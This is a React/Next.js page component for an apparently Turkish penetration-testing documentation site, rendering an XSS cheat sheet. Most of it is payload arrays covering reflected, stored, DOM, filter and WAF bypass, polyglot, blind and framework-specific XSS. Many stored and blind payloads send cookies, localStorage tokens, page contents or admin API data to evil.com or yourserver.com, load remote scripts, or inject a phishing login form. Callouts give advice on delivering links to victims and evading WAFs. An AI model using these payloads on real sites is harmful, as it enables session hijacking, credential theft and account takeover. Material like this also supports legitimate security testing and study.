"use client"

import { motion } from "framer-motion"
import Link from "next/link"
import { Globe } from "lucide-react"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "reflected-xss", title: "Reflected XSS", level: 2 },
  { id: "stored-xss", title: "Stored XSS", level: 2 },
  { id: "dom-xss", title: "DOM-based XSS", level: 2 },
  { id: "filter-bypass", title: "Filter Bypass", level: 2 },
  { id: "waf-bypass", title: "WAF Bypass", level: 2 },
  { id: "polyglot", title: "Polyglot Payloads", level: 2 },
  { id: "blind-xss", title: "Blind XSS", level: 2 },
  { id: "framework-xss", title: "Framework-Specific", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

// Payload Collections
const reflectedPayloads = [
  { code: `<script>alert(1)</script>`, note: "Klasik payload, genelde filtrelenir" },
  { code: `<img src=x onerror=alert(1)>`, note: "img tag ile event handler" },
  { code: `<svg onload=alert(1)>`, note: "SVG elementi" },
  { code: `<body onload=alert(1)>` },
  { code: `<input onfocus=alert(1) autofocus>`, note: "Autofocus ile otomatik tetikleme" },
  { code: `<marquee onstart=alert(1)>` },
  { code: `<video src=x onerror=alert(1)>` },
  { code: `<audio src=x onerror=alert(1)>` },
  { code: `<details open ontoggle=alert(1)>`, note: "HTML5 elementi" },
  { code: `<iframe src="javascript:alert(1)">` },
  { code: `<object data="javascript:alert(1)">` },
  { code: `<embed src="javascript:alert(1)">` },
  { code: `<a href="javascript:alert(1)">click</a>` },
  { code: `<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click` },
  { code: `<form action="javascript:alert(1)"><input type=submit>` },
  { code: `<isindex action="javascript:alert(1)" type=submit value=click>` },
  { code: `<select onfocus=alert(1) autofocus>` },
  { code: `<textarea onfocus=alert(1) autofocus>` },
  { code: `<keygen onfocus=alert(1) autofocus>` },
  { code: `<frameset onload=alert(1)>` },
  { code: `<table background="javascript:alert(1)">` },
  { code: `<div style="width:expression(alert(1))">`, note: "IE only - CSS expression" },
  { code: `<link rel="import" href="data:text/html,<script>alert(1)</script>">` },
  { code: `<base href="javascript:/a/-alert(1)//">` },
]

const storedPayloads = [
  { code: `<script>fetch('https://evil.com/?c='+document.cookie)</script>`, note: "Cookie çalma" },
  { code: `<img src=x onerror="location='https://evil.com/?c='+document.cookie">`, note: "Redirect ile exfiltration" },
  { code: `<svg/onload="eval(atob('YWxlcnQoMSk='))">`, note: "Base64 encoded payload" },
  { code: `<script>new Image().src='https://evil.com/?c='+document.cookie</script>` },
  { code: `<script>navigator.sendBeacon('https://evil.com',document.cookie)</script>`, note: "Beacon API" },
  { code: `<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">` },
  { code: `<script>document.location='https://evil.com/?c='+localStorage.getItem('token')</script>`, note: "LocalStorage exfil" },
  { code: `<iframe src="javascript:fetch('https://evil.com/?c='+parent.document.cookie)">` },
  { code: `<script>var i=new Image();i.src='https://evil.com/?c='+btoa(document.body.innerHTML)</script>`, note: "DOM exfiltration" },
  { code: `<script>fetch('/api/user').then(r=>r.text()).then(d=>fetch('https://evil.com/?d='+btoa(d)))</script>`, note: "API response çalma" },
  { code: `<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil.com',JSON.stringify(d)))</script>` },
  { code: `<script>document.body.innerHTML='<form action=https://evil.com/phish method=post><input name=user placeholder=Username><input name=pass type=password placeholder=Password><input type=submit></form>'</script>`, note: "Phishing form injection" },
]

const domPayloads = [
  { code: `#<img src=x onerror=alert(1)>`, note: "location.hash kullanımı" },
  { code: `javascript:alert(document.domain)`, note: "javascript: protocol" },
  { code: `data:text/html,<script>alert(1)</script>` },
  { code: `"><script>alert(1)</script>`, note: "Attribute breakout" },
  { code: `'-alert(1)-'`, note: "JS string içinde" },
  { code: `\\'-alert(1)//`, note: "Escape bypass" },
  { code: `</script><script>alert(1)</script>`, note: "Script tag kapatma" },
  { code: "${alert(1)}", note: "Template literal" },
  { code: `{{constructor.constructor('alert(1)')()}}`, note: "Angular sandbox escape" },
  { code: `[].constructor.constructor('alert(1)')()`, note: "Prototype chain" },
  { code: `window['alert'](1)`, note: "Bracket notation" },
  { code: `this['alert'](1)` },
  { code: `self['alert'](1)` },
  { code: `top['alert'](1)` },
  { code: `frames['alert'](1)` },
  { code: `globalThis['alert'](1)` },
  { code: `parent['alert'](1)` },
  { code: `content['alert'](1)` },
  { code: `Function('alert(1)')()`, note: "Function constructor" },
  { code: `eval.call(null,'alert(1)')` },
  { code: `setTimeout('alert(1)')` },
  { code: `setInterval('alert(1)')` },
  { code: `new Function('alert(1)')()` },
  { code: `Reflect.apply(alert,null,[1])` },
]

const filterBypassPayloads = [
  { code: `<ScRiPt>alert(1)</ScRiPt>`, note: "Mixed case" },
  { code: `<scr<script>ipt>alert(1)</scr</script>ipt>`, note: "Nested tags" },
  { code: `<script>alert(1)//`, note: "Unclosed tag" },
  { code: `<script>alert(1)<!–`, note: "HTML comment" },
  { code: `<script x>alert(1)</script>`, note: "Extra attribute" },
  { code: `<script/x>alert(1)</script>`, note: "Slash bypass" },
  { code: `<<script>alert(1)//<</script>`, note: "Double bracket" },
  { code: `%3Cscript%3Ealert(1)%3C/script%3E`, note: "URL encoding" },
  { code: `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`, note: "HTML entity hex" },
  { code: `&#60;script&#62;alert(1)&#60;/script&#62;`, note: "HTML entity decimal" },
  { code: `\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E`, note: "JS hex encoding" },
  { code: `\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E`, note: "Unicode encoding" },
  { code: `<img src=x onerror=\\u0061lert(1)>`, note: "Unicode in event" },
  { code: `<img src=x onerror=al\\u0065rt(1)>` },
  { code: `<img/src=x onerror=alert(1)>`, note: "No space" },
  { code: `<img\tsrc=x\tonerror=alert(1)>`, note: "Tab yerine space" },
  { code: `<img\nsrc=x\nonerror=alert(1)>`, note: "Newline" },
  { code: `<img src=x onerror=alert(1)//` },
  { code: `<img src=x onerror="alert(1)"` },
  { code: `<img src=x onerror='alert(1)'` },
  { code: `<img src=x onerror=alert\`1\`>`, note: "Template literal" },
  { code: `<img src=x onerror=alert&lpar;1&rpar;>`, note: "HTML entities" },
  { code: `<img src=x onerror=\\x61lert(1)>` },
  { code: `<svg><script>alert&#40;1&#41;</script></svg>`, note: "SVG context HTML entities" },
  { code: `<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>` },
  { code: `<img src="x" onerror="&#x61;lert(1)">` },
  { code: `<a href="&#x6A;avascript:alert(1)">click</a>` },
  { code: `<img src=x onerror="\${alert(1)}">`, note: "ES6 template" },
]

const wafBypassPayloads = [
  { code: `<svg/onload=alert(1)>`, note: "Slash yerine space" },
  { code: `<svg onload=alert(1)//` },
  { code: `<svg\x0Conload=alert(1)>`, note: "Form feed character" },
  { code: `<svg\x0Donload=alert(1)>`, note: "Carriage return" },
  { code: `<svg\x09onload=alert(1)>`, note: "Tab character" },
  { code: `<svg\x0Aonload=alert(1)>`, note: "Line feed" },
  { code: `<body/onload=alert(1)>` },
  { code: `<body\tonload=alert(1)>` },
  { code: `<img src=x:alert onerror=eval(src)>`, note: "Eval trick" },
  { code: `<img src=1 onerror=alert(1)>` },
  { code: `<img src=1 onerRor=alert(1)>` },
  { code: `<img src=1 oNeRrOr=alert(1)>` },
  { code: `<iMg sRc=1 oNeRrOr=alert(1)>` },
  { code: `<a href="j&#x41;vascript:alert(1)">click</a>`, note: "HTML entity in protocol" },
  { code: `<a href="j\\u0061vascript:alert(1)">click</a>`, note: "Unicode escape" },
  { code: `<svg><script>al\\u0065rt(1)</script></svg>` },
  { code: `<math><mi//xlink:href="data:x,<script>alert(1)</script>">` },
  { code: `<input type=image src=x onerror=alert(1)>` },
  { code: `<isindex type=image src=1 onerror=alert(1)>` },
  { code: `<form><button formaction="javascript:alert(1)">click` },
  { code: `<math><brute href="javascript:alert(1)">click` },
  { code: `<html ontouchstart=alert(1)>`, note: "Mobile event" },
  { code: `<body onscroll=alert(1)><div style=height:10000px></div>` },
  { code: `<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>` },
  { code: `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x">` },
  { code: `<img src=valid.jpg onload=alert(1)>`, note: "Valid image with onload" },
  { code: `<body onresize=alert(1)>`, note: "Window resize event" },
  { code: `<body onorientationchange=alert(1)>`, note: "Mobile orientation" },
  { code: `<video><source onerror=alert(1)>` },
  { code: `<audio><source onerror=alert(1)>` },
]

const polyglotPayloads = [
  { code: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`, note: "Portswigger polyglot" },
  { code: `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>">` },
  { code: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>'` },
  { code: `-->'"/></sCript><deTailS open oNToggle=alert()>` },
  { code: `'"--></style></script><svg oNload=alert()>` },
  { code: `'-alert(1)-'` },
  { code: `\\'-alert(1)//` },
  { code: `</script><svg onload=alert(1)>` },
  { code: `</title><svg onload=alert(1)>` },
  { code: `</textarea><svg onload=alert(1)>` },
  { code: `</style><svg onload=alert(1)>` },
  { code: `</noscript><svg onload=alert(1)>` },
  { code: `</template><svg onload=alert(1)>` },
  { code: `<input onfocus="alert(1)" autofocus>` },
  { code: `"><img src=x onerror=alert(1)><"` },
]

const blindXSSPayloads = [
  { code: `"><script src=https://yourserver.com/x.js></script>`, note: "External script" },
  { code: `"><img src=x onerror="var s=document.createElement('script');s.src='https://yourserver.com/x.js';document.body.appendChild(s);">` },
  { code: `<script>var i=new Image();i.src="https://yourserver.com/?c="+document.cookie;</script>`, note: "Out-of-band exfiltration" },
  { code: `"><script src=//yourserver.com/x.js></script>`, note: "Protocol-relative URL" },
  { code: `<img src=x onerror="fetch('https://yourserver.com/log?cookie='+document.cookie)">` },
  { code: `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://yourserver.com/x.js\\';document.body.appendChild(a)')` },
  { code: `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yourserver.com/x.js");a.send();</script>` },
  { code: `<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veW91cnNlcnZlci5jb20veC5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs autofocus>`, note: "Base64 payload in ID" },
  { code: `<img src=x onerror="(new Image).src='https://yourserver.com/?c='+btoa(document.documentElement.innerHTML)">`, note: "Full page exfil" },
  { code: `<svg onload="fetch('https://yourserver.com/?loc='+encodeURIComponent(location.href)+'&cookie='+document.cookie)">` },
  { code: `<img src=x onerror="navigator.sendBeacon('https://yourserver.com/collect',JSON.stringify({cookie:document.cookie,url:location.href,localStorage:JSON.stringify(localStorage)}))">`, note: "Full data exfil" },
]

const angularPayloads = [
  { code: `{{constructor.constructor('alert(1)')()}}`, note: "AngularJS sandbox escape" },
  { code: `{{$on.constructor('alert(1)')()}}` },
  { code: `{{$eval.constructor('alert(1)')()}}` },
  { code: `{{'a'.constructor.prototype.charAt=[].join;$eval('x]alert(1)//');}}` },
  { code: `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x]alert(1)');}}` },
  { code: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a]alert(1)')}}` },
  { code: `{{[].pop.constructor('alert(1)')()}}` },
  { code: `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]alert(1)//';}}` },
  { code: `{{'a]alert(1)//'}}`, note: "AngularJS 1.0.1-1.1.5" },
  { code: `{{constructor.constructor('alert(1)')()}}`, note: "AngularJS 1.2.0-1.2.18" },
]

const vuePayloads = [
  { code: `{{_c.constructor('alert(1)')()}}`, note: "Vue 2.x" },
  { code: `{{$el.ownerDocument.defaultView.alert(1)}}` },
  { code: `<div v-html="'<img src=x onerror=alert(1)>'"></div>` },
  { code: `{{_self.constructor.constructor('alert(1)')()}}` },
  { code: `{{this.constructor.constructor('alert(1)')()}}` },
]

const reactPayloads = [
  { code: `dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}`, note: "dangerouslySetInnerHTML" },
  { code: `javascript:alert(1)`, note: "href attribute (older versions)" },
  { code: `<div ref={(x) => x.innerHTML = '<img src=x onerror=alert(1)>'}>` },
]

const svgPayloads = [
  { code: `<svg><script>alert(1)</script></svg>` },
  { code: `<svg onload=alert(1)>` },
  { code: `<svg><animate onbegin=alert(1)>` },
  { code: `<svg><set onbegin=alert(1)>` },
  { code: `<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>` },
  { code: `<svg><image href="x" onerror=alert(1)>` },
  { code: `<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">` },
  { code: `<svg><a><rect width=100% height=100%></rect><animate attributeName=href to=javascript:alert(1)>` },
  { code: `<svg xmlns="http://www.w3.org/2000/svg"><g onload="alert(1)"></g></svg>` },
]

const mxssPayloads = [
  { code: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, note: "mXSS via math/table" },
  { code: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->` },
  { code: `<svg></p><style><g title="</style><img src=x onerror=alert(1)>">` },
  { code: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` },
  { code: `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>` },
]

export default function XSSPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      
      <motion.article
        initial="initial"
        animate="animate"
        variants={stagger}
        className="prose prose-invert max-w-none"
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
            <Globe className="w-4 h-4" />
            <span>Web Zafiyetleri</span>
          </div>
          
          <h1 className="text-4xl font-bold text-foreground mb-4">
            XSS (Cross-Site Scripting)
          </h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Cross-Site Scripting, web uygulamalarında kullanıcı girdilerinin doğru şekilde 
            filtrelenmemesi sonucu oluşan bir zafiyet türüdür. Saldırgan, kurban tarayıcısında 
            keyfi JavaScript kodu çalıştırabilir.
          </p>
        </motion.div>

        <Callout type="tip" title="Context Analizi">
          XSS test ederken önce context&apos;i belirleyin: HTML body, attribute, JavaScript, URL? 
          Her context için farklı payload stratejisi gerekir.
        </Callout>

        {/* Reflected XSS */}
        <motion.section variants={fadeIn} id="reflected-xss" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Reflected XSS
          </h2>
          <p className="text-muted-foreground mb-4">
            Kullanıcı girdisi sunucuya gönderilir ve anında response&apos;da yansıtılır. 
            URL parametreleri, form inputları ve header değerleri test edilmelidir.
          </p>
          
          <Callout type="info" title="Dipnot">
            Reflected XSS için URL&apos;yi kurbanla paylaşmanız gerekir. URL shortener veya 
            open redirect chain kullanılabilir.
          </Callout>

          <PayloadList 
            title="Basic Reflected Payloads" 
            payloads={reflectedPayloads}
            initialShow={6}
          />
        </motion.section>

        {/* Stored XSS */}
        <motion.section variants={fadeIn} id="stored-xss" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Stored XSS
          </h2>
          <p className="text-muted-foreground mb-4">
            Payload veritabanına kaydedilir ve diğer kullanıcılar sayfayı ziyaret ettiğinde çalışır.
            Yorum alanları, profil bilgileri ve mesaj sistemleri hedef alınabilir.
          </p>

          <Callout type="warning" title="High Severity">
            Stored XSS genelde P1/Critical kabul edilir çünkü kullanıcı etkileşimi gerektirmez 
            ve çoklu kurbanı etkileyebilir. Admin panel&apos;de stored XSS = account takeover.
          </Callout>

          <PayloadList 
            title="Cookie Stealing & Exfiltration" 
            payloads={storedPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* DOM XSS */}
        <motion.section variants={fadeIn} id="dom-xss" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            DOM-based XSS
          </h2>
          <p className="text-muted-foreground mb-4">
            Payload sunucuya gitmez, doğrudan client-side JavaScript tarafından işlenir.
            location.hash, document.URL, localStorage gibi kaynaklar kontrol edilmeli.
          </p>

          <Callout type="tip" title="Source & Sink">
            DOM XSS için source (veri kaynağı) ve sink (tehlikeli fonksiyon) çiftlerini bulun.
            innerHTML, eval(), document.write() en yaygın sink&apos;lerdir.
          </Callout>

          <PayloadList 
            title="DOM Manipulation Payloads" 
            payloads={domPayloads}
            initialShow={6}
          />
        </motion.section>

        {/* Filter Bypass */}
        <motion.section variants={fadeIn} id="filter-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Filter Bypass
          </h2>
          <p className="text-muted-foreground mb-4">
            Uygulamalar genellikle XSS&apos;e karşı filtreleme yapar. Bu filtreleri atlatmak için 
            encoding, case manipulation ve tag manipulation teknikleri kullanılır.
          </p>

          <Callout type="info" title="Dipnot">
            Filtreler genelde blacklist tabanlıdır. Nadir kullanılan tag ve event handler&apos;ları 
            deneyin: onpointerover, onanimationend, onfocusin, onwheel
          </Callout>

          <PayloadList 
            title="Encoding & Case Bypass" 
            payloads={filterBypassPayloads}
            initialShow={8}
          />
        </motion.section>

        {/* WAF Bypass */}
        <motion.section variants={fadeIn} id="waf-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
            WAF Bypass
          </h2>
          <p className="text-muted-foreground mb-4">
            Web Application Firewall&apos;lar XSS payload&apos;larını tespit etmeye çalışır. 
            Whitespace manipulation, encoding ve obfuscation ile bypass edilebilir.
          </p>

          <Callout type="warning" title="WAF Detection">
            Önce hangi WAF olduğunu tespit edin (wafw00f, Wappalyzer). Cloudflare, Akamai, 
            AWS WAF her birinin farklı bypass teknikleri var.
          </Callout>

          <PayloadList 
            title="WAF Evasion Payloads" 
            payloads={wafBypassPayloads}
            initialShow={8}
          />
        </motion.section>

        {/* Polyglot */}
        <motion.section variants={fadeIn} id="polyglot" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-green-500/10 text-green-400 text-sm font-mono">06</span>
            Polyglot Payloads
          </h2>
          <p className="text-muted-foreground mb-4">
            Polyglot payload&apos;lar birden fazla context&apos;te çalışacak şekilde tasarlanmıştır. 
            Blind testing veya context belirsiz olduğunda kullanılır.
          </p>

          <Callout type="tip" title="Dipnot">
            Polyglot payload&apos;lar uzun ve karmaşık olabilir. WAF&apos;lar tarafından kolayca 
            tespit edilebilir, önce basit payload&apos;ları deneyin.
          </Callout>

          <PayloadList 
            title="Universal Polyglots" 
            payloads={polyglotPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* Blind XSS */}
        <motion.section variants={fadeIn} id="blind-xss" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-pink-500/10 text-pink-400 text-sm font-mono">07</span>
            Blind XSS
          </h2>
          <p className="text-muted-foreground mb-4">
            Payload admin paneli gibi göremediğiniz bir yerde çalışır. 
            Kendi callback sunucunuz ile tespit edilir.
          </p>

          <Callout type="info" title="Dipnot">
            Contact form, support ticket, feedback, user-agent, referer header&apos;ları 
            ideal blind XSS hedefleridir. Interactsh veya kendi VPS&apos;inizi kullanın.
          </Callout>

          <PayloadList 
            title="Out-of-Band Payloads" 
            payloads={blindXSSPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* Framework Specific */}
        <motion.section variants={fadeIn} id="framework-xss" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-cyan-500/10 text-cyan-400 text-sm font-mono">08</span>
            Framework-Specific
          </h2>
          <p className="text-muted-foreground mb-4">
            Modern JavaScript framework&apos;leri kendi template engine&apos;lerini kullanır. 
            Her birinin sandbox escape teknikleri farklıdır.
          </p>

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">AngularJS (1.x)</h4>
          <Callout type="info" title="Dipnot">
            AngularJS versiyonunu kontrol edin. Her versiyon için farklı sandbox escape var.
            ng-app attribute&apos;ü olan element&apos;i bulun.
          </Callout>
          <PayloadList 
            title="Angular Sandbox Escape" 
            payloads={angularPayloads}
            initialShow={4}
          />

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">Vue.js</h4>
          <PayloadList 
            title="Vue Template Injection" 
            payloads={vuePayloads}
            initialShow={3}
          />

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">React</h4>
          <Callout type="tip" title="Dipnot">
            React varsayılan olarak XSS&apos;e karşı güvenlidir. dangerouslySetInnerHTML 
            kullanımı arayın.
          </Callout>
          <PayloadList 
            title="React XSS Vectors" 
            payloads={reactPayloads}
            initialShow={3}
          />

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">SVG Context</h4>
          <PayloadList 
            title="SVG XSS Payloads" 
            payloads={svgPayloads}
            initialShow={4}
          />

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">mXSS (Mutation XSS)</h4>
          <Callout type="warning" title="Dipnot">
            mXSS, HTML sanitizer&apos;ların browser&apos;ın DOM parsing davranışını 
            yanlış tahmin etmesi sonucu oluşur. DOMPurify bypass için kullanılır.
          </Callout>
          <PayloadList 
            title="mXSS Payloads" 
            payloads={mxssPayloads}
            initialShow={3}
          />
        </motion.section>

        {/* Footer Navigation */}
        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs"
              className="text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              Ana Sayfa
            </Link>
            <Link
              href="/docs/web/sql-injection"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              SQL Injection
              <span>→</span>
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
